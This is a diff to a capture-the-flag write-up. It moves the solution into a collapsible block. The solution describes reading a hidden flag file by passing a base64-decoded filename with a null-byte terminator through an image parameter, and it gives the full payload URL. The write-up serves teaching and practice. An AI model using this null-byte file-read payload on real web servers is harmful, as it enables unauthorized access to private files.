@@ -6,6 +6,9 @@ Look beyond what you see. Take a leap of faith.
 
 ## Solution
 
+<details>
+	<summary>Click to reveal!</summary>
+
 `?name=` is the GET parameter to specify an image.
 
 Figure out that filenames are base64 encoded (but not the jpg/png extension), the default image extension is jpeg, and that a null-byte `%00` marks the end of a filename.
@@ -27,4 +30,5 @@ Also notice the `secrets` directory. Do the same as above, but decode `secrets/f
 echo urlencode(base64_decode("secrets/flag")); # %B1%E7%2Bz%DB%3F%7EV%A0
 ```
 
-Final payload: `[URL]?name=%B1%E7%2Bz%DB%3F%7EV%A0.png%00`
+Payload: `[URL]?name=%B1%E7%2Bz%DB%3F%7EV%A0.png%00`
+</details>
